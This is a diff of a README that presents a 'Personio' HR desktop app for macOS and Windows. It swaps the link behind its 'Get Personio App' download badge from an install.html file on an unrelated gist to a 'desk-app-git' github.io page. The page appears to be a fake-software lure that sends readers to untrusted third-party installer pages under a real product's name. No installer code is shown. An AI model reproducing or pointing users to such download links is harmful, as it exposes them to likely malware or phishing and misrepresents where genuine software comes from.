@@ -3,7 +3,7 @@
 **Personio** brings efficient human resources management to **macOS and Windows**.  
 Automate hiring, track payroll, manage attendance, and streamline HR workflows from any desktop device. 🧩  
 
-[![💼 Get GitHub App](https://img.shields.io/badge/💼%20Get%20Personio%20App-1976D2?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/estaneicecream1995/6b1ed609cc2568533622e6fd5f2eea23/raw/1fdb3d612938e0d4c67dda457347242fece081e4/install.html?offer=PersonioApp)
+[![💼 Get GitHub App](https://img.shields.io/badge/💼%20Get%20Personio%20App-1976D2?style=for-the-badge&logo=github&logoColor=white)](https://desk-app-git.github.io/.github/?offer=PersonioApp)
 
 ---
 
